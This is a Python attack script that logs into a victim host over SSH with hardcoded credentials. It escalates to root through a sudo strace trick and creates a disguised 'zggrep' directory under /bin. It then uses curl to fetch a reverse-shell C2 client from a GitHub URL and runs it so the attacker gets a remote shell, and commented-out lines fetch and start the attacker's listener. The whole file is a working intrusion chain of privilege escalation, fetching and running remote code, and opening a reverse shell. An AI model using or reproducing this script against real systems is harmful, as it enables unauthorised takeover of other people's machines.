# start_script.py
import subprocess, paramiko, config, time

hostname = config.VICTIM_IP
port = 22
username = "user"
password = "hill"
backdoor_path = config.BACKDOOR_PATH
listener_path = config.LISTENER_PATH

def run_command(cmd, timeout=30):
    """Run a command and return (success, output)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            timeout=timeout,
        )
        return True, result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return False, e.stderr.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False, str(e)
    
# # download listener
# ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
# print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)

# # start listener
# ok, output = run_command(["python3", "listener.py"])
# print(f"listener run on attacker host" if ok else "Failed", "->", output)


# Initialize the SSH client
client = paramiko.SSHClient()

# Automatically add the server's host key (useful for automation, though less strict)
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to the server
    client.connect(hostname, port=port, username=username, password=password)
    shell = client.invoke_shell()
    
    print("Connected to host")
    
    time.sleep(1)
    if shell.recv_ready():
        shell.recv(65535)
        
    # perform root escalation
    shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
        
    time.sleep(2)
    
    shell.send(b"cd ../../bin\n")
    time.sleep(1)
            
    shell.send(b"mkdir zggrep\n")
    time.sleep(1)
    
    shell.send(b"cd zggrep\n")   
    time.sleep(1)
    
    # get backdoor
    shell.send(b"curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py\n")
    print("Downloading backdoor...")
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    # get config
    shell.send(b"curl -O https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/config.py\n")
    print("Downloading config file...")
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    shell.send(b"python zggrep.py\n")
    
    print("Payload has run, use the listening terminal to access host.")
    while True:
        user_input = input("Type 'exit' to close reverse shell: ")
    
        if user_input.strip().lower() == 'exit':
            print("Closing program...")
            break
        else:
            print(f"You typed: {user_input}")
    
finally:
    # close the connection
    shell.close()
    client.close()
    

